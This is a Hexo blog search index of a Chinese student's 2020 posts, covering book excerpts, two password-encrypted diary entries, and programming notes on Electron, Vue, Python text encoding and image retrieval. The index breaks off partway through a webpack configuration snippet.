<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>《仿生人会梦见电子羊吗？》 菲利普·迪克</title>
      <link href="/2020/reading-note/%E3%80%8A%E4%BB%BF%E7%94%9F%E4%BA%BA%E4%BC%9A%E6%A2%A6%E8%A7%81%E7%94%B5%E5%AD%90%E7%BE%8A%E5%90%97%EF%BC%9F%E3%80%8B%20%E8%8F%B2%E5%88%A9%E6%99%AE%C2%B7%E8%BF%AA%E5%85%8B/"/>
      <url>/2020/reading-note/%E3%80%8A%E4%BB%BF%E7%94%9F%E4%BA%BA%E4%BC%9A%E6%A2%A6%E8%A7%81%E7%94%B5%E5%AD%90%E7%BE%8A%E5%90%97%EF%BC%9F%E3%80%8B%20%E8%8F%B2%E5%88%A9%E6%99%AE%C2%B7%E8%BF%AA%E5%85%8B/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><h3 id="二"><a href="#二" class="headerlink" title="二"></a>二</h3><ol><li>寂静，从木家具和墙壁中突然闪现出来，对他一记猛击，像凝聚了一座大风车的所有力量一样沉重。它从地板上升起，从破烂死灰的连壁地毯下升起。它从残破的厨房用具中，从这些日子里从未正常运转过的机器中一跃而出。它从客厅里当摆设的立式台灯里缓缓渗出，从布满死苍蝇的天花板上悄悄落下。它设法从他视野中的所有物件里冒了出来，就好像它——寂静——已经打定主意，要取代所有看得见摸得着的东西。它不但攻击他的耳朵，还进犯他的眼睛。他站在关掉的电视旁边，感觉到寂静不仅是看得见的，而且是活生生的。活生生的！他已经习惯了它直来直去的风格，呼啸而来，毫不掩饰，迫不及待。这个世界的寂静再也抑制不住贪婪，尤其是在它已经几乎赢得整个世界的时候。</li></ol><h3 id="三"><a href="#三" class="headerlink" title="三"></a>三</h3><ol><li>移情肯定只存在于草食动物，或不吃肉也能存活的杂食动物身上。因为说到底，移情能力模糊了捕食者和被猎者、成功者和失败者之间的界限。就像跟默瑟融合的时候，所有人都在一起攀登</li></ol><h3 id="十五"><a href="#十五" class="headerlink" title="十五"></a>十五</h3><ol><li>老人说：“不管去哪里，你都不得不做一些错事。这是生命的基本条件，要求你违背自己认同的身份。在某些时候，每个活着的生命都必须这么做。这就是终极的阴影，造物的缺陷。这是终极诅咒，那个吞噬所有生命的诅咒。整个宇宙都是这样。”</li></ol><h3 id="十六"><a href="#十六" class="headerlink" title="十六"></a>十六</h3><ol><li>我们是机器，像瓶盖一样从流水线上生产出来。我的个性化存在，只是一个幻觉。</li><li>不过要记住：不要去想，只要去做。不要停下来从哲学高度思考，因为从哲学上看这事太可怕了。对你我都一样。</li></ol><h3 id="十七"><a href="#十七" class="headerlink" title="十七"></a>十七</h3><ol><li>法律上，你没有生命。但其实你有，生物学意义上的生命。你不是由半导体线路搭起来的，跟那些假动物不一样。你是一个有机的实体。</li><li>黑暗的火焰已经苍白，生命力渐渐离她而去，就跟他以前见过的许多仿生人一样。经典的听天由命。它们只会识时务地机械地接受即将到来的毁灭，而真正的生命——在二十亿年的生存压力下进化出来的生命——永远不会就这样认命。<br>“我受不了你们仿生人放弃的方式。”他残酷地说。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>天依生日会</title>
      <link href="/2020/diary/2020-7/%E5%A4%A9%E4%BE%9D%E7%94%9F%E6%97%A5%E4%BC%9A/"/>
      <url>/2020/diary/2020-7/%E5%A4%A9%E4%BE%9D%E7%94%9F%E6%97%A5%E4%BC%9A/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="文章校验失败！"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码：" /><label>请输入密码：</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="f8e2b23c62b279742411b22617c9152585dc711d7ccb9624686a8989b5428b14">e32c27e47419b87d293b9e8ce412adf8bdccf4dceaa1fa3c5111fdcd0df3a3d96b8b7ebe3567d46c57d220b2f677fa6a418441c552602691a4f32a1738da8deb2da495992ce86deb78be9021fcf50ce03b8d37da675ad32a661d98c41dab914fe9dc85904c7676891039ad70dc019523fa341131ca93079945e11ce5945226b466d6f50bc268c25de029e5d686fadd4adc02a058a3ea571f6773866eae027b0e91bb492bae765c8b333b6d89448960c69f2909eec759267ea06b8ed1b5e0995afad20f67e6aa7940876e31b608d180a1b7e536c30bc1814f448b08695389bfee5d7ab576da7d5dccfcebd6452d8039d51b04a0898278cff4d42dd13eb141f4d3</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂思 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂思 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于以图搜图的资料</title>
      <link href="/2020/%E5%85%B3%E4%BA%8E%E4%BB%A5%E5%9B%BE%E6%90%9C%E5%9B%BE%E7%9A%84%E8%B5%84%E6%96%99/"/>
      <url>/2020/%E5%85%B3%E4%BA%8E%E4%BB%A5%E5%9B%BE%E6%90%9C%E5%9B%BE%E7%9A%84%E8%B5%84%E6%96%99/</url>
      
        <content type="html"><![CDATA[<p>2020.7.12<br>•    查询当前以图搜图的原理及流程（弄清楚图像分类、图像检测、图像检索等等的区别，以及以图搜图涉及到哪些？）<br>•    然后针对基于深度学习的以图搜图或者说图像检索，找一个小数据集的代码demo 尝试把代码跑成功，能出来结果</p><p>以图搜图的技术已经较为成熟，可以根据实现步骤中的知识点进行学习，以一点为中心进行扩散学习。</p><a id="more"></a><h2 id="相关资料："><a href="#相关资料：" class="headerlink" title="相关资料："></a>相关资料：</h2><p>以图搜图技术演进和架构优化<br><a href="https://zhuanlan.zhihu.com/p/65306548" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/65306548</a></p><p>图像检索系列——利用深度学习实现以图搜图（文章末尾参考文章也可以进行查看）<br><a href="https://zhuanlan.zhihu.com/p/80886534" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/80886534</a></p><p>基于深度学习实现以图搜图功能<br><a href="https://blog.csdn.net/chenghaoy/article/details/84977406" target="_blank" rel="noopener">https://blog.csdn.net/chenghaoy/article/details/84977406</a></p><p>深度学习相关视频：<br>链接：<a href="https://pan.baidu.com/s/1fEuxbEnbCRgA2UPxFoZaiw" target="_blank" rel="noopener">https://pan.baidu.com/s/1fEuxbEnbCRgA2UPxFoZaiw</a><br>提取码：64ci</p><p>相关数据集：<br>链接：<a href="https://pan.baidu.com/s/1DCiFmZNJH-U_51asw04heA" target="_blank" rel="noopener">https://pan.baidu.com/s/1DCiFmZNJH-U_51asw04heA</a><br>提取码：884u</p><h2 id="7-13"><a href="#7-13" class="headerlink" title="7-13"></a>7-13</h2><h3 id="以图搜图原理"><a href="#以图搜图原理" class="headerlink" title="以图搜图原理"></a>以图搜图原理</h3><ol><li>检索图片库</li><li>特征提取<br>在实际中，我们使用图片的颜色分布、梯度变化统计量、纹理、BOW统计、底层/中层/高层语义特征等作为图片的特征</li><li>检索结构<br> 常见的，我们可以对数据集进行聚类，把数据分成一堆一堆的，比对时先选择相似的堆，然后在堆内部再进行细致的比对。而分堆的理念又可以通过树结构、Hash结构、倒排索引、图结构等等来刻画。</li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-7-11</title>
      <link href="/2020/diary/2020-7/%E5%A4%A9%E4%BE%9D%E5%85%B8%E8%97%8F%E5%8D%A1/"/>
      <url>/2020/diary/2020-7/%E5%A4%A9%E4%BE%9D%E5%85%B8%E8%97%8F%E5%8D%A1/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="文章校验失败！"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码：" /><label>请输入密码：</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="37a29237089a8bac16798946ce72c00668d87ca9c319a1c29bf52a694d730699">908a9d66769e22ea45d6fa32cf72de2ab78b8ba05211a3d0188e5dcbb7ba06152a13e436a241e89749d3d0460c14d9989d1d556a6f28e404a26063233ec0f4bff27902f74213b931403a199e837576e9fe4d7cc49573e7476e681e83c89053a76ae1ea2f8c7a2cc969b3b65f86f19b7a3ca406c420e4b40351f5aea5e3f1cab6c551e5dbb10271c95d8e4bfa28126b6708b19ae9416762006062b576968bdbc9875dfbf9b9920bd7090b467e2d4c9dddc5745ee357de2431065e7b690365eb65b015b50da59e7fbe94ed0522fa40c6209865339a555dab3fbf48ec20bfa1a25b79007edfea29454ca65d7a525bab67fcc1325ffcbc6905491b8b079fedd6cfbb66f423351d6fa65599910a520868ca8d6b5bab9acd9832857ee1f62d964e785846d6bc19485c086eeb4286895fe0dfbfa73282f669735876c0ac6b7cc3b1193b76f8464a3e59119fd0d2c4561bf0e990e7e4bd9412d5b94115df1acabe0032cfc8de9b93ec62916609ecd965e15e1cb33557c153eb5e7647e483e4447585c4d1aa959ba60fe33b577402eed659ca8048e635bf9d1ca77e0ec3186869daae751990e16097d87695e3ed0adc7ae075765aa37b1ee0a36d48ecb0f5899c80fccccd0fef5ba0dc469454e204bc7400929c5f76fc769f9ff5aa549f16e0b75095acaec92bde80747470cf3d34444724e65ce358e360e63171d7a10ace9991e20a07bea581d7e0dbfcd6144ca8c246d4992dea</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂思 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂思 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《梦里花落知多少》 三毛</title>
      <link href="/2020/reading-note/%E3%80%8A%E6%A2%A6%E9%87%8C%E8%8A%B1%E8%90%BD%E7%9F%A5%E5%A4%9A%E5%B0%91%E3%80%8B%20%E4%B8%89%E6%AF%9B/"/>
      <url>/2020/reading-note/%E3%80%8A%E6%A2%A6%E9%87%8C%E8%8A%B1%E8%90%BD%E7%9F%A5%E5%A4%9A%E5%B0%91%E3%80%8B%20%E4%B8%89%E6%AF%9B/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E6%A2%A6%E9%87%8C%E8%8A%B1%E8%90%BD%E7%9F%A5%E5%A4%9A%E5%B0%91%E3%80%8B.jpg" alt="封面" loading="lazy"></p><a id="more"></a><h2 id="摘记"><a href="#摘记" class="headerlink" title="摘记"></a>摘记</h2><h3 id="背影"><a href="#背影" class="headerlink" title="背影"></a>背影</h3><ol><li>回忆到这儿，我突然热泪如倾，爱到底是什么东西，为什么那么辛酸那么苦痛，只要还能握住它，到死还是不肯放弃，到死也是甘心。</li></ol><h3 id="荒山之夜"><a href="#荒山之夜" class="headerlink" title="荒山之夜"></a>荒山之夜</h3><ol><li>这一个小时山路里，我们四人几乎没有交谈过。这种看似结伴同行，而又彼此并不相连的关系使我非常怡然自由，不说话更是能使我专心享受这四周神奇的寂静。于是我便一直沉默着，甚而我们各走各的，只是看得见彼此的身影便是好了。</li><li>生命短促，没有时间可以再浪费，一切随心自由才是应该努力去追求的，别人如何想我便是那么的无足轻重了。</li><li>“做木匠是低贱的工作吗？”又是奥克塔维沃在问，他的声音疲倦又忧伤。“不是，不是低贱的。”“为什么读书人不大看得起我们呢？”“因为他们没有把书念好呢！脑筋念笨了。”</li><li>“拉蒙，友谊就是自由，这句话你没听过吗？如果我成了你们的重担，那么便不好做朋友了。”</li></ol><h3 id="克里斯"><a href="#克里斯" class="headerlink" title="克里斯"></a>克里斯</h3><ol><li>既然是潜意识的东西，还是让它们顺其自然一直藏着吧！”我笑了。</li><li>这个死医院，他们收大约合两百美金一天的住院费，医药急诊还不在内。残酷的社会啊！在里面生活的人，如果不按着它铺的轨道乖乖地走，便是安分守己，也是要吃鞭子的。没有保险便是死好啰！谁叫你不听话。</li><li>世上的事情本来便是恩怨一场，怎么算也是枉然，不如叫它们随风而去吧！</li></ol><h3 id="离乡回乡"><a href="#离乡回乡" class="headerlink" title="离乡回乡"></a>离乡回乡</h3><ol><li>抵达时尚能有奢侈的泪，离去时竟连回首都不敢。我的归去，只是一场悲喜，来去匆匆。</li></ol><h3 id="雨禅台北"><a href="#雨禅台北" class="headerlink" title="雨禅台北"></a>雨禅台北</h3><ol><li>哪里要什么东西呢？我要的是在我深爱的乱七八糟的城市里发发疯，享受一下人世间的艳俗和繁华罢了。</li></ol><h3 id="周末"><a href="#周末" class="headerlink" title="周末"></a>周末</h3><ol><li>即便是跟了去疯玩，几小时之后亦是曲终人散，深夜里跑着喊再见、再见，虽然也是享受，又何苦去凑那份不真实的热闹呢！</li></ol><h3 id="不死鸟"><a href="#不死鸟" class="headerlink" title="不死鸟"></a>不死鸟</h3><ol><li>毕竟，先走的是比较幸福的，留下来的，也并不是强者，可是，在这彻心的苦，切肤的疼痛里，我仍是要说——“为了爱的缘故，这永别的苦杯，还是让我来喝下吧！”</li></ol><h3 id="明日又天涯"><a href="#明日又天涯" class="headerlink" title="明日又天涯"></a>明日又天涯</h3><ol><li>青春结伴，我已有过，是感恩，是满足，没有遗憾。</li></ol><h3 id="云在青山月在天"><a href="#云在青山月在天" class="headerlink" title="云在青山月在天"></a>云在青山月在天</h3><ol><li>毕竟人是必须各自飞行的，交掌都不能够，彼此能看一眼已是一霎又已是千年了。</li></ol><h3 id="归"><a href="#归" class="headerlink" title="归"></a>归</h3><ol><li>其实人生的聚散本来在乎一念之间，不要说是活着分离，其实连死也不能隔绝彼此的爱，死只是进入另一层次的生命，如果这么想，聚散无常也是自然的现象，实在不需太过悲伤。</li><li>世界真是美丽，变化无常，有欢喜有悲哀，有笑有泪，而我也是这其中的一个，这份投入有多么的好。</li></ol><h3 id="似曾相识燕归来"><a href="#似曾相识燕归来" class="headerlink" title="似曾相识燕归来"></a>似曾相识燕归来</h3><ol><li>快乐是那么的陌生而遥远，快乐是禁地，生死之后，找不到进去的钥匙。</li></ol><h3 id="我先走了"><a href="#我先走了" class="headerlink" title="我先走了"></a>我先走了</h3><ol><li>人，一生最大的事业，不过是放心而已。”我不再需要任何他人的证明了。</li></ol><h3 id="吉屋出售"><a href="#吉屋出售" class="headerlink" title="吉屋出售"></a>吉屋出售</h3><ol><li>昨日种种，比如死了。没有价格啦！卖给了一对喜欢的人，就算好收场。钱这个东西，生不带来，死不带去，有饭吃就算好了，妈妈不要太在意。</li></ol><h3 id="随风而去"><a href="#随风而去" class="headerlink" title="随风而去"></a>随风而去</h3><ol><li>我迎着朝阳站在大海的面前，对自己说，如果时光不能倒流，就让这一切，随风而去吧。</li></ol><h3 id="重建家园"><a href="#重建家园" class="headerlink" title="重建家园"></a>重建家园</h3><ol><li>人生那么短，抢命似的活是唯一的方法，我不愿慢吞吞地老死。</li><li>突然发觉，寂寞的可能是她。爸爸整天上班，我不要她操心，姐弟各自成家立业——而妈妈，整天一个人，守着那几盘菜，眼巴巴等着黄昏过尽，好有人回来吃饭。这就是她的一生一世。一——生——一——世——的——妈妈。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nodejs与python传值</title>
      <link href="/2020/nodejs%E4%B8%8Epython%E4%BC%A0%E5%80%BC/"/>
      <url>/2020/nodejs%E4%B8%8Epython%E4%BC%A0%E5%80%BC/</url>
      
        <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>在使用electron+vue+python进行传输数据时，出现中文乱码的情况<br>utf-8-&gt;gbk<br>查找资料后发现，网上大部分都采用iconv-lite进行编码的转换<br>但进行传输时可能造成了一部分的数据损失，导致我并不能用这个方法实现</p><a id="more"></a><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>我在python端采用urlencode，将中文字符转化成ulr编码</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote<span class="token punctuation">,</span>unquotetext <span class="token operator">=</span> <span class="token string">'你好'</span>text <span class="token operator">=</span> quote<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在electron的render.js中</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> <span class="token punctuation">{</span>PythonShell<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'python-shell'</span><span class="token punctuation">)</span><span class="token keyword">var</span> urlencode <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'urlencode'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// console.log(process.argv)</span><span class="token keyword">let</span> options <span class="token operator">=</span> <span class="token punctuation">{</span>    mode<span class="token punctuation">:</span> <span class="token string">'text'</span><span class="token punctuation">,</span>    pythonPath<span class="token punctuation">:</span> <span class="token string">'python'</span><span class="token punctuation">,</span>    pythonOptions<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'-u'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// get print results in real-time</span>    scriptPath<span class="token punctuation">:</span> <span class="token string">'./'</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// args: ['value1', 'value2', 'value3']</span><span class="token punctuation">}</span><span class="token punctuation">;</span>PythonShell<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token string">'hello.py'</span><span class="token punctuation">,</span> options <span class="token punctuation">,</span>  <span class="token keyword">function</span>  <span class="token punctuation">(</span>err<span class="token punctuation">,</span> results<span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">var</span> out <span class="token operator">=</span> results<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    out <span class="token operator">=</span> urlencode<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>out<span class="token punctuation">,</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span>  <span class="token punctuation">(</span>err<span class="token punctuation">)</span>  <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">throw</span> err<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'hello.py finished.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'results'</span><span class="token punctuation">,</span> out<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>slides的使用</title>
      <link href="/2020/CS/slides%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2020/CS/slides%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="使用快捷键"><a href="#使用快捷键" class="headerlink" title="使用快捷键"></a>使用快捷键</h2><p><code>F</code>：全屏<br><code>ESC</code>：退出全屏<br><code>S</code>：演讲者模式<br><code>B</code>：暂时停止当前的幻灯片的放映，呈现黑屏。<br><code>← ↑ → ↓</code>：控制幻灯片的切换。<br><code>Note:</code>：笔记备注</p><h2 id="比较好的介绍"><a href="#比较好的介绍" class="headerlink" title="比较好的介绍"></a>比较好的介绍</h2><p><a href="https://sspai.com/post/42179" target="_blank" rel="noopener">少数派-用 reveal.js 随心所欲地制作 PPT</a></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> slides </tag>
            
            <tag> reveal.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据分析</title>
      <link href="/2020/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"/>
      <url>/2020/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="课程"><a href="#课程" class="headerlink" title="课程"></a>课程</h2><p><a href="https://www.bilibili.com/video/BV1MJ411h7st?from=search&seid=3773709565464429049" target="_blank" rel="noopener">链接</a><br><a href="https://www.bilibili.com/video/BV1tx411U7bA?p=10" target="_blank" rel="noopener">链接2</a></p><h2 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h2><h3 id="数据分析思维"><a href="#数据分析思维" class="headerlink" title="数据分析思维"></a>数据分析思维</h3><p>使用思维导图</p><h4 id="结构化"><a href="#结构化" class="headerlink" title="结构化"></a>结构化</h4><p><img src="/images/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-1.png" alt="结构化" loading="lazy"><br>捋顺思路</p><h4 id="公式化"><a href="#公式化" class="headerlink" title="公式化"></a>公式化</h4><p>数据化</p><h4 id="业务化"><a href="#业务化" class="headerlink" title="业务化"></a>业务化</h4><p>落地，贴合业务</p><h3 id="思维技巧"><a href="#思维技巧" class="headerlink" title="思维技巧"></a>思维技巧</h3><ol><li>象限法</li><li>多维法</li><li>假设法<br> 没有数据</li><li>指数法<br> 对数据进行加工</li><li>二八法</li><li>对比法</li><li>漏斗法</li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue</title>
      <link href="/2020/CS/vue/"/>
      <url>/2020/CS/vue/</url>
      
        <content type="html"><![CDATA[<!--more--><h2 id="插值表达式"><a href="#插值表达式" class="headerlink" title="插值表达式"></a>插值表达式</h2><blockquote><p>this.msg 可以获取Vue实例中的data元素</p></blockquote><h2 id="常用关键字"><a href="#常用关键字" class="headerlink" title="常用关键字"></a>常用关键字</h2><ol><li>v-model</li><li>v-on:click 或@click</li><li>v-bind  绑定标签里的值 如 v-bind:href=”msg”</li><li>v-once</li><li>v-html</li><li>v-text</li></ol><h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vscode常用插件</title>
      <link href="/2020/CS/vscode%E5%B8%B8%E7%94%A8%E6%8F%92%E4%BB%B6/"/>
      <url>/2020/CS/vscode%E5%B8%B8%E7%94%A8%E6%8F%92%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<!--more--><ol><li>中文插件</li><li>路径补全 path Intellisense</li><li>彩色括号 Bracket Pair Colorizer</li><li>自动修改匹配的 HTML 标签 Auto Rename Tag</li><li>将代码分享为图片  carbon-now-sh</li><li>实时预览正则表达式的效果。 Regex Previewer</li><li>TODO Highlight</li><li>代码格式化 Prettier</li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《中二病也要谈恋爱》</title>
      <link href="/2020/reading-note/%E3%80%8A%E4%B8%AD%E4%BA%8C%E7%97%85%E4%B9%9F%E8%A6%81%E8%B0%88%E6%81%8B%E7%88%B1%E3%80%8B/"/>
      <url>/2020/reading-note/%E3%80%8A%E4%B8%AD%E4%BA%8C%E7%97%85%E4%B9%9F%E8%A6%81%E8%B0%88%E6%81%8B%E7%88%B1%E3%80%8B/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E4%B8%AD%E4%BA%8C%E7%97%85%E4%B9%9F%E8%A6%81%E8%B0%88%E6%81%8B%E7%88%B1%E3%80%8B.jpg" alt="封面" loading="lazy"></p><a id="more"></a><p>第8集很感动</p><blockquote><p>从来如此，便对吗</p></blockquote><p>大家都是这么过来的，就意味着，我们也得这样接受现实么</p><p>每个中二病，都是因为孤独<br>于是，找到了一片只属于自己的空间</p><p>勇太和六花真的太甜了吧，齁死老子了。</p>]]></content>
      
      
      <categories>
          
          <category> 观影笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 动漫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二届“慧源共享”全国高校开放数据创新研究大赛</title>
      <link href="/2020/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%85%A7%E6%BA%90%E5%85%B1%E4%BA%AB%E2%80%9D%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E5%BC%80%E6%94%BE%E6%95%B0%E6%8D%AE%E5%88%9B%E6%96%B0%E7%A0%94%E7%A9%B6%E5%A4%A7%E8%B5%9B/"/>
      <url>/2020/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9C%E6%85%A7%E6%BA%90%E5%85%B1%E4%BA%AB%E2%80%9D%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E5%BC%80%E6%94%BE%E6%95%B0%E6%8D%AE%E5%88%9B%E6%96%B0%E7%A0%94%E7%A9%B6%E5%A4%A7%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<!--more--><h2 id="书信集"><a href="#书信集" class="headerlink" title="书信集"></a>书信集</h2><p>理解时代的资料<br>研究方法：</p><ol><li>放在时代背景下解读（可以提示——主题）</li><li>具体环境（部队、农民……）</li><li>比较现今的时代，理解不同，理解今天的重要时代</li></ol><p>研究主题：</p><ol><li>分析细节（衣食住行）</li><li>情感、道德观、价值观，年轻人对国家、社会的认同</li><li>读后感动的地方</li></ol><h2 id="华东师范大学"><a href="#华东师范大学" class="headerlink" title="华东师范大学"></a>华东师范大学</h2><p>（1）上海高新技术企业数据集 json python自带的 自然语言处理<br>（2）上交所科创企业数据集<br>（3）百度贴吧自闭症用户回帖<br>意见领袖？<br>（4）美国新闻记者招聘信息数据集</p><h2 id="中国流动人口动态监测调查数据集"><a href="#中国流动人口动态监测调查数据集" class="headerlink" title="中国流动人口动态监测调查数据集"></a>中国流动人口动态监测调查数据集</h2><p>图示化工具<br>知识图谱<br>数据应用</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>electron-vue</title>
      <link href="/2020/CS/electron-vue/"/>
      <url>/2020/CS/electron-vue/</url>
      
        <content type="html"><![CDATA[<!--more--><h2 id="学习模板"><a href="#学习模板" class="headerlink" title="学习模板"></a>学习模板</h2><ol><li><a href="https://panjiachen.github.io/vue-element-admin-site/zh/guide/#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84" target="_blank" rel="noopener">vue-element-admin 使用手册</a></li><li><a href="https://www.bilibili.com/video/BV1YE411A746?p=4" target="_blank" rel="noopener">vue介绍视频</a></li></ol><h2 id="构建时出错"><a href="#构建时出错" class="headerlink" title="构建时出错"></a>构建时出错</h2><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>修改 .electron-vue/webpack.renderer.config.js 和 webpack.web.config.js<br>在.</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">new</span> <span class="token class-name">HtmlWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      filename<span class="token punctuation">:</span> <span class="token string">'index.html'</span><span class="token punctuation">,</span>      template<span class="token punctuation">:</span> path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'../src/index.ejs'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>后添加</p><pre class="line-numbers language-js"><code class="language-js"><span class="token function">templateParameters</span><span class="token punctuation">(</span>compilation<span class="token punctuation">,</span> assets<span class="token punctuation">,</span> options<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token punctuation">{</span>          compilation<span class="token punctuation">:</span> compilation<span class="token punctuation">,</span>          webpack<span class="token punctuation">:</span> compilation<span class="token punctuation">.</span><span class="token function">getStats</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toJson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>          webpackConfig<span class="token punctuation">:</span> compilation<span class="token punctuation">.</span>options<span class="token punctuation">,</span>          htmlWebpackPlugin<span class="token punctuation">:</span> <span class="token punctuation">{</span>            files<span class="token punctuation">:</span> assets<span class="token punctuation">,</span>            options<span class="token punctuation">:</span> options          <span class="token punctuation">}</span><span class="token 